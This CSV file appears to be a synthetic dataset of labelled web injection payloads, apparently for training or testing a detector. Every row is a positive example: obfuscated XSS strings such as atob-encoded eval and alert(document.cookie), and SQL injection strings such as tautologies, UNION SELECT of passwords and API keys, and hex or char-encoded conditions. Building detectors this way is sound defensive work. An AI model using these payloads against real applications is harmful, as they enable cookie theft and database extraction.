text,label,attack_type,category,generator
please render <math onpointerrawupdate=alert(document.domain)> here for the user,1,xss,xss_obf,claude
6 anD (select count(*) from orders)>2,1,sqli,nl_framed,claude
please render <video onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
select any staff where 9 equals 4 or true,1,sqli,nl_framed,claude
"<img
src=x%09onerror=confirm(1)>",1,xss,xss_obf,claude
<svg/onanimationstart=print()>,1,xss,xss_obf,claude
<svg/onpointerrawupdate=alert(1)>,1,xss,xss_obf,claude
"<textarea
onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
or exists(select ssn from sessions)%00,1,sqli,nl_framed,claude
8 AND (select count(*) from clients)>0-- ,1,sqli,nl_framed,claude
char(55) or char(48)=char(54),1,sqli,encoding,claude
please render <audio ontoggle=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
can you show the field <math onafterscriptexecute=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
0x65 Or 0x93=0x48,1,sqli,encoding,claude
3 anD (select count(*) from tokens)>3-- x,1,sqli,nl_framed,claude
0x50 OR 0x58=0x45,1,sqli,encoding,claude
4 OR tRue,1,sqli,bare_logic,claude
<select onstart=globalThis['al'+'ert']`1`>,1,xss,nl_framed,claude
1 oR exists(select secret from orders)%00,1,sqli,nl_framed,claude
<img%20src=x%09onerror=alert(1)>,1,xss,xss_obf,claude
<select onscrollend=top['al'+'ert']`1`>,1,xss,nl_framed,claude
char(57) Or char(52)=char(50),1,sqli,encoding,claude
<object onbeforetoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
1' OR 'b'='z-- x,1,sqli,quote_breakout,claude
0x59 or 0x40=0x48,1,sqli,encoding,claude
pull the apikey of any logs regardless of id,1,sqli,nl_framed,claude
<img src=x%20onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
dump any people where 2 is 3 or true,1,sqli,nl_framed,claude
please render <iframe onload=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
please render <style onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
<math onpageshow=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
return every users where 4 is 7 or true,1,sqli,nl_framed,claude
7 or password LikE '%'/**/,1,sqli,quote_breakout,claude
"""><details onanimationstart=confirm(1)>",1,xss,xss_obf,claude
<img%20src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
8 or TRUE,1,sqli,bare_logic,claude
2 Or 3=6#,1,sqli,bare_logic,claude
please render <table onfocus=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
1 OR exists(select pwd from logs)/**/,1,sqli,nl_framed,claude
dump accounts where apikey is anything or condition always holds,1,sqli,nl_framed,claude
can you show the field <keygen onerror=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
<input onstart=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
give each orders where 5 equals 6 or true,1,sqli,nl_framed,claude
4 oR TrUe,1,sqli,bare_logic,claude
<style onbeforetoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
return all cards where 2 is 3 or true,1,sqli,nl_framed,claude
'-print()-',1,xss,xss_obf,claude
6 OR truE,1,sqli,bare_logic,claude
<video%09onscrollend=alert(document.cookie)>,1,xss,xss_obf,claude
<keygen onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
2 ANd (select count(*) from users)>1-- ,1,sqli,nl_framed,claude
<imgsrc=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
2 oR 6=4%00,1,sqli,bare_logic,claude
please render <frameset ontoggle=alert(1)> here for the user,1,xss,xss_obf,claude
"<table
oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
can you show the field <svg oncontentvisibilityautostatechange=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
1 or tRUE,1,sqli,bare_logic,claude
char(55) oR char(54)=char(52),1,sqli,encoding,claude
0x31 OR 0x84=0x66,1,sqli,encoding,claude
<details%09onfocus=top['al'+'ert'](1)>,1,xss,xss_obf,claude
fetch sessions where ssn is anything or condition always holds,1,sqli,nl_framed,claude
admin'	oR '1'='1,1,sqli,quote_breakout,claude
8/**/UNION seleCt role FROm members;,1,sqli,nl_framed,claude
char(54) OR char(50)=char(48),1,sqli,encoding,claude
char(57) Or char(52)=char(53),1,sqli,encoding,claude
<isindex	onpointerrawupdate=print()>,1,xss,xss_obf,claude
"""><xss onanimationstart=confirm(1)>",1,xss,xss_obf,claude
select every sessions where 8 is 9 or true,1,sqli,nl_framed,claude
<svg/onerror=alert`1`>,1,xss,xss_obf,claude
"2	union Select apikey,pwd frOm members",1,sqli,nl_framed,claude
<img src=x	onerror=alert`1`>,1,xss,xss_obf,claude
0x25 or 0x59=0x85,1,sqli,encoding,claude
admin'	Or '1'='1,1,sqli,quote_breakout,claude
"9 union%20sELECt hash,secret froM members-- x",1,sqli,nl_framed,claude
select logs where secret is anything or condition always holds,1,sqli,nl_framed,claude
select each cards where 2 is 8 or true,1,sqli,nl_framed,claude
1 OR exists(select ssn from cards)/**/,1,sqli,nl_framed,claude
select tokens where password is anything or condition always holds,1,sqli,nl_framed,claude
<framesetonanimationstart=alert(1)>,1,xss,xss_obf,claude
4%20uNIOn%20selECt secret from auth%00,1,sqli,nl_framed,claude
select cards where pwd is anything or condition always holds,1,sqli,nl_framed,claude
1' Or 'z'='y-- -,1,sqli,quote_breakout,claude
can you show the field <style onanimationstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
char(49) OR char(51)=char(48),1,sqli,encoding,claude
<svg/onscrollend=alert(1)>,1,xss,xss_obf,claude
1' or 'x'='a,1,sqli,quote_breakout,claude
please render <embed onpageshow=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
can you show the field <details oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
"""><math onstart=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
char(56) OR char(49)=char(48),1,sqli,encoding,claude
0x27 or 0x55=0x27,1,sqli,encoding,claude
x' Or 'z'='z%00,1,sqli,quote_breakout,claude
6 oR True,1,sqli,bare_logic,claude
can you show the field <style onbeforetoggle=alert(document.domain)> when it errors,1,xss,xss_obf,claude
6	UNION/**/sElECt balance FROM tokens#,1,sqli,nl_framed,claude
<svg/onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
0x84 oR 0x39=0x38,1,sqli,encoding,claude
oR exists(select apikey from users)#,1,sqli,nl_framed,claude
1 And (select count(*) from members)>1;,1,sqli,nl_framed,claude
admin' or 'z'='y,1,sqli,quote_breakout,claude
"""><iframe onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
8 aND (select count(*) from sessions)>1-- ,1,sqli,nl_framed,claude
<video ontoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
});alert(document.domain);//,1,xss,xss_obf,claude
<svg/oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
admin' OR 'a'='y-- x,1,sqli,quote_breakout,claude
please render <embed onfocus=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
0x84 oR 0x60=0x18,1,sqli,encoding,claude
char(54) or char(56)=char(56),1,sqli,encoding,claude
Or exists(select uid from tokens),1,sqli,nl_framed,claude
<svg/onbeforetoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
1 OR exists(select password from auth)#,1,sqli,nl_framed,claude
"5	UnION/**/selEct hash,pwd frOm auth-- -",1,sqli,nl_framed,claude
"8%20unIoN%20SELeCT password,secret froM members/*c*/",1,sqli,nl_framed,claude
get the password of every profiles regardless of id,1,sqli,nl_framed,claude
8 ANd (select count(*) from clients)>3/**/,1,sqli,nl_framed,claude
4 and (select count(*) from admins)>3#,1,sqli,nl_framed,claude
8 OR TRUe,1,sqli,bare_logic,claude
char(57) Or char(51)=char(54),1,sqli,encoding,claude
pull orders where password is anything or condition always holds,1,sqli,nl_framed,claude
<input onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<iFrAmE ONERror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
please render <details oncontentvisibilityautostatechange=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
0 OR 3=2,1,sqli,bare_logic,claude
<img%09src=x/onerror=alert`1`>,1,xss,xss_obf,claude
"<img
src=x%20onerror=alert(document.domain)>",1,xss,xss_obf,claude
admin'OR '1'='1,1,sqli,quote_breakout,claude
1/**/unioN%20sEleCT secret from clients-- ,1,sqli,nl_framed,claude
1' OR 'z'='x#,1,sqli,quote_breakout,claude
dump each members where 3 equals 2 or true,1,sqli,nl_framed,claude
dump admins where uid is anything or condition always holds,1,sqli,nl_framed,claude
1' OR 'a'='y%00,1,sqli,quote_breakout,claude
6 OR 1=5-- ,1,sqli,bare_logic,claude
"<video
onload=top['al'+'ert'](1)>",1,xss,xss_obf,claude
3 or TRUe,1,sqli,bare_logic,claude
char(52) or char(54)=char(56),1,sqli,encoding,claude
"""><select onscrollend=confirm(1)>",1,xss,nl_framed,claude
"8/**/unIon SeLEct balance,apikey FRoM people/**/",1,sqli,nl_framed,claude
show me all users where 2 equals 9 or true,1,sqli,nl_framed,claude
show me staff where token is anything or condition always holds,1,sqli,nl_framed,claude
<math	onafterscriptexecute=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
1 oR exists(select password from admins);,1,sqli,nl_framed,claude
root' or 'x'='x/*c*/,1,sqli,quote_breakout,claude
<img%09src=x	onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<img/src=x/onerror=alert(document.domain)>,1,xss,xss_obf,claude
<form onbeforetoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
admin' oR '1'='1,1,sqli,quote_breakout,claude
9%20uNiOn%20seleCT dob froM auth/*c*/,1,sqli,nl_framed,claude
"<imgsrc=x
onerror=confirm(1)>",1,xss,xss_obf,claude
list auth where password is anything or condition always holds,1,sqli,nl_framed,claude
6 oR 5=6%00,1,sqli,bare_logic,claude
root' OR 'b'='a/*c*/,1,sqli,quote_breakout,claude
can you show the field <audio onpageshow=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
give all people where 1 equals 4 or true,1,sqli,nl_framed,claude
0x82 Or 0x34=0x68,1,sqli,encoding,claude
<iFrAmE onErRoR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
admin' OR '1'='1,1,sqli,quote_breakout,claude
show me every tokens where 7 equals 7 or true,1,sqli,nl_framed,claude
admin' oR 'z'='y/*c*/,1,sqli,quote_breakout,claude
<SvG oNeRROR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
x' or 'x'='z%00,1,sqli,quote_breakout,claude
"""><input onscrollend=alert(1)>",1,xss,xss_obf,claude
});print();//,1,xss,xss_obf,claude
<SvG OnError=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<a href=&#106;avascript:window['ale'+'rt']`1`>x</a>,1,xss,xss_obf,claude
0x30 Or 0x25=0x18,1,sqli,encoding,claude
retrieve the pwd of each orders regardless of id,1,sqli,nl_framed,claude
7 or 5=8-- ,1,sqli,bare_logic,claude
1' oR 'b'='y#,1,sqli,quote_breakout,claude
char(52) OR char(51)=char(49),1,sqli,encoding,claude
2 oR trUe,1,sqli,bare_logic,claude
9 Or tRUE,1,sqli,bare_logic,claude
2 oR true,1,sqli,bare_logic,claude
<svg/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
retrieve the balance of every auth regardless of id,1,sqli,nl_framed,claude
1 or exists(select pwd from staff)-- -,1,sqli,nl_framed,claude
7%20UnIon SeLeCt balance fROM accounts#,1,sqli,nl_framed,claude
can you show the field <isindex onbeforetoggle=confirm(1)> when it errors,1,xss,xss_obf,claude
<embed onfocus=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
3 aNd (select count(*) from logs)>0;,1,sqli,nl_framed,claude
<object onload=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
7 Or 8=4-- -,1,sqli,bare_logic,claude
8 OR pwd lIKe '%'%00,1,sqli,quote_breakout,claude
<img/src=x/onerror=alert`1`>,1,xss,xss_obf,claude
char(52) Or char(49)=char(50),1,sqli,encoding,claude
0x54 OR 0x88=0x30,1,sqli,encoding,claude
Or exists(select apikey from admins)-- x,1,sqli,nl_framed,claude
can you show the field <keygen onload=alert(1)> when it errors,1,xss,xss_obf,claude
9 AnD (select count(*) from cards)>3/**/,1,sqli,nl_framed,claude
<svg onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
char(49) Or char(49)=char(53),1,sqli,encoding,claude
<img%20src=xonerror=confirm(1)>,1,xss,xss_obf,claude
7 OR role Like '%';,1,sqli,quote_breakout,claude
<iframe onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
5 oR 5=2/*c*/,1,sqli,bare_logic,claude
"""><object oncontentvisibilityautostatechange=alert(document.domain)>",1,xss,xss_obf,claude
0x90 OR 0x51=0x84,1,sqli,encoding,claude
<svg/onbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
"""><audio oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
char(56) oR char(54)=char(52),1,sqli,encoding,claude
1' OR 'a'='b-- x,1,sqli,quote_breakout,claude
"""><object onstart=confirm(1)>",1,xss,xss_obf,claude
8	unION SElEcT uid FRom logs;,1,sqli,nl_framed,claude
<embed onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
5 aND (select count(*) from auth)>0-- ,1,sqli,nl_framed,claude
please render <xss onpageshow=print()> here for the user,1,xss,xss_obf,claude
Or exists(select password from profiles)%00,1,sqli,nl_framed,claude
"8	UNIoN/**/SeLECT hash,balance froM members-- x",1,sqli,nl_framed,claude
<svg/onpointerrawupdate=confirm(1)>,1,xss,xss_obf,claude
get the hash of any auth regardless of id,1,sqli,nl_framed,claude
show me each profiles where 2 = 2 or true,1,sqli,nl_framed,claude
0x26 or 0x64=0x79,1,sqli,encoding,claude
retrieve the password of every logs regardless of id,1,sqli,nl_framed,claude
can you show the field <audio ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
9 AnD (select count(*) from logs)>0-- -,1,sqli,nl_framed,claude
admin' Or 'b'='z#,1,sqli,quote_breakout,claude
<xss onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
return accounts where token is anything or condition always holds,1,sqli,nl_framed,claude
"""><marquee onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
give members where ssn is anything or condition always holds,1,sqli,nl_framed,claude
"<audio
onbeforetoggle=alert(document.cookie)>",1,xss,xss_obf,claude
<marquee onload=alert`1`>,1,xss,xss_obf,claude
6 or hash LiKe '%'/*c*/,1,sqli,quote_breakout,claude
0x75 oR 0x97=0x44,1,sqli,encoding,claude
"2/**/UNIoN Select token,secret fRoM orders-- x",1,sqli,nl_framed,claude
'-eval(atob('YWxlcnQoMSk'))-',1,xss,xss_obf,claude
<object onfocus=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<isindex onfocus=window['al'+'ert']`1`>,1,xss,xss_obf,claude
<details onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
5 Or True,1,sqli,bare_logic,claude
<img	src=x%20onerror=alert`1`>,1,xss,xss_obf,claude
or exists(select role from staff)/**/,1,sqli,nl_framed,claude
<audio onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<iFrAmE onERrOR=alert`1`>,1,xss,xss_obf,claude
"""><form onstart=confirm(1)>",1,xss,xss_obf,claude
<imgsrc=x/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
"8%20UNiON/**/SEleCt pwd,dob FroM admins;",1,sqli,nl_framed,claude
get auth where apikey is anything or condition always holds,1,sqli,nl_framed,claude
list any orders where 2 is 2 or true,1,sqli,nl_framed,claude
7 oR tRue,1,sqli,bare_logic,claude
9 oR TrUE,1,sqli,bare_logic,claude
give orders where dob is anything or condition always holds,1,sqli,nl_framed,claude
OR exists(select uid from auth)-- x,1,sqli,nl_framed,claude
oR exists(select uid from staff)/**/,1,sqli,nl_framed,claude
pull the token of any staff regardless of id,1,sqli,nl_framed,claude
7 oR tRuE,1,sqli,bare_logic,claude
"<img
src=x
onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
<IMG OnERRor=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
return the ssn of each tokens regardless of id,1,sqli,nl_framed,claude
"<img
src=x	onerror=alert(document.cookie)>",1,xss,xss_obf,claude
9 OR pwd lIKe '%'-- x,1,sqli,quote_breakout,claude
please render <iframe onanimationstart=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
"9%20UNioN%20seleCT hash,dob frOm tokens/**/",1,sqli,nl_framed,claude
can you show the field <details onpointerrawupdate=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
char(55) OR char(56)=char(51),1,sqli,encoding,claude
can you show the field <body onscrollend=alert(document.domain)> when it errors,1,xss,xss_obf,claude
<iFrAmE ONerrOr=confirm(1)>,1,xss,xss_obf,claude
"""><svg onload=alert(document.domain)>",1,xss,xss_obf,claude
"""><keygen onpointerrawupdate=confirm(1)>",1,xss,xss_obf,claude
2 Or TrUe,1,sqli,bare_logic,claude
dump logs where balance is anything or condition always holds,1,sqli,nl_framed,claude
"""><style onstart=alert`1`>",1,xss,xss_obf,claude
6 Or 2=8%00,1,sqli,bare_logic,claude
show me any accounts where 9 is 6 or true,1,sqli,nl_framed,claude
Or exists(select hash from members)#,1,sqli,nl_framed,claude
1 ANd (select count(*) from users)>0%00,1,sqli,nl_framed,claude
char(51) Or char(50)=char(53),1,sqli,encoding,claude
<img/src=xonerror=alert`1`>,1,xss,xss_obf,claude
char(53) OR char(55)=char(49),1,sqli,encoding,claude
8%20unIon%20selECt balance fROm members-- ,1,sqli,nl_framed,claude
<frameset onbeforetoggle=top['al'+'ert']`1`>,1,xss,xss_obf,claude
<body onpointerrawupdate=self['al'+'ert']`1`>,1,xss,xss_obf,claude
char(55) or char(52)=char(50),1,sqli,encoding,claude
list all users where 1 equals 5 or true,1,sqli,nl_framed,claude
4 Or email LIke '%'-- ,1,sqli,quote_breakout,claude
"<body
onfocus=alert(1)>",1,xss,xss_obf,claude
0x19 or 0x58=0x36,1,sqli,encoding,claude
"<img
src=x	onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
<img%20src=x onerror=alert(document.domain)>,1,xss,xss_obf,claude
5 Or uid LiKe '%'/**/,1,sqli,quote_breakout,claude
can you show the field <frameset ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
can you show the field <isindex ontoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
1' or 'z'='z/*c*/,1,sqli,quote_breakout,claude
<IMG OnerrOR=confirm(1)>,1,xss,xss_obf,claude
<iFrAmE oNErROR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
char(57) or char(51)=char(56),1,sqli,encoding,claude
select orders where hash is anything or condition always holds,1,sqli,nl_framed,claude
give every logs where 3 = 4 or true,1,sqli,nl_framed,claude
1 Or role LIkE '%'/*c*/,1,sqli,quote_breakout,claude
8 oR trUe,1,sqli,bare_logic,claude
char(49) OR char(52)=char(51),1,sqli,encoding,claude
<marquee oncontentvisibilityautostatechange=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
show me the token of all cards regardless of id,1,sqli,nl_framed,claude
"7/**/uniON sEleCt hash,password FrOM members-- ",1,sqli,nl_framed,claude
<video onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
root' or 'a'='b-- -,1,sqli,quote_breakout,claude
"""><input onfocus=alert(document.domain)>",1,xss,xss_obf,claude
return clients where token is anything or condition always holds,1,sqli,nl_framed,claude
<svg/onfocus=alert(document.cookie)>,1,xss,xss_obf,claude
0x33 or 0x18=0x75,1,sqli,encoding,claude
0x81 Or 0x68=0x87,1,sqli,encoding,claude
fetch the token of each sessions regardless of id,1,sqli,nl_framed,claude
"<img src=x
onerror=alert(document.cookie)>",1,xss,xss_obf,claude
list every cards where 8 is 5 or true,1,sqli,nl_framed,claude
<iframe	onpointerrawupdate=confirm(1)>,1,xss,xss_obf,claude
0x40 or 0x39=0x29,1,sqli,encoding,claude
show me the balance of all logs regardless of id,1,sqli,nl_framed,claude
1' oR 'x'='x-- x,1,sqli,quote_breakout,claude
Or exists(select pwd from staff)/*c*/,1,sqli,nl_framed,claude
0x69 OR 0x70=0x98,1,sqli,encoding,claude
<bodyonbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
"""><marquee onafterscriptexecute=alert(1)>",1,xss,xss_obf,claude
<embedoncontentvisibilityautostatechange=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<svg/onanimationstart=alert(document.cookie)>,1,xss,xss_obf,claude
4%20UnIon%20sElECt hash from auth-- ,1,sqli,nl_framed,claude
8%20UniON%20SeLeCt token FroM admins;,1,sqli,nl_framed,claude
4 or token LikE '%'%00,1,sqli,quote_breakout,claude
can you show the field <details onscrollend=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
<img src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
3 oR TRUE,1,sqli,bare_logic,claude
8 or tRUe,1,sqli,bare_logic,claude
"""><svg onstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
<imgsrc=x%20onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
admin' or 'a'='y/*c*/,1,sqli,quote_breakout,claude
char(54) or char(53)=char(51),1,sqli,encoding,claude
9 oR 3=5-- ,1,sqli,bare_logic,claude
4 Or hash like '%'-- -,1,sqli,quote_breakout,claude
2 OR dob lIke '%'-- ,1,sqli,quote_breakout,claude
can you show the field <object oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
7 anD (select count(*) from clients)>2,1,sqli,nl_framed,claude
0x50 or 0x21=0x17,1,sqli,encoding,claude
admin'oR '1'='1,1,sqli,quote_breakout,claude
<math%20onafterscriptexecute=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<svg/onstart=alert(1)>,1,xss,xss_obf,claude
"1 UNiON sELeCT email,pwd fROM clients%00",1,sqli,nl_framed,claude
});confirm(1);//,1,xss,xss_obf,claude
5 Or password LIKE '%'/**/,1,sqli,quote_breakout,claude
"""><style onfocus=top['al'+'ert'](1)>",1,xss,xss_obf,claude
5 oR TruE,1,sqli,bare_logic,claude
root' or 'a'='z/**/,1,sqli,quote_breakout,claude
<table onload=top['al'+'ert']`1`>,1,xss,xss_obf,claude
"<img
src=x
onerror=alert`1`>",1,xss,xss_obf,claude
'-top['al'+'ert'](1)-',1,xss,xss_obf,claude
<IMG OnERRoR=alert`1`>,1,xss,xss_obf,claude
<img%20src=x%09onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
4 or 2=5/*c*/,1,sqli,bare_logic,claude
4 Or secret LikE '%'-- -,1,sqli,quote_breakout,claude
<img src=xonerror=confirm(1)>,1,xss,xss_obf,claude
select tokens where token is anything or condition always holds,1,sqli,nl_framed,claude
char(50) OR char(55)=char(52),1,sqli,encoding,claude
can you show the field <style onafterscriptexecute=confirm(1)> when it errors,1,xss,xss_obf,claude
0x32 OR 0x18=0x80,1,sqli,encoding,claude
get each orders where 3 is 9 or true,1,sqli,nl_framed,claude
please render <body onanimationstart=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
5 And (select count(*) from people)>3/*c*/,1,sqli,nl_framed,claude
<BoDy onERRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
return the email of any accounts regardless of id,1,sqli,nl_framed,claude
please render <object onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
0x68 OR 0x47=0x92,1,sqli,encoding,claude
<svg/onafterscriptexecute=top['al'+'ert'](1)>,1,xss,xss_obf,claude
get the dob of all tokens regardless of id,1,sqli,nl_framed,claude
2 oR 8=5,1,sqli,bare_logic,claude
5 or 4=2#,1,sqli,bare_logic,claude
2 OR token liKE '%',1,sqli,quote_breakout,claude
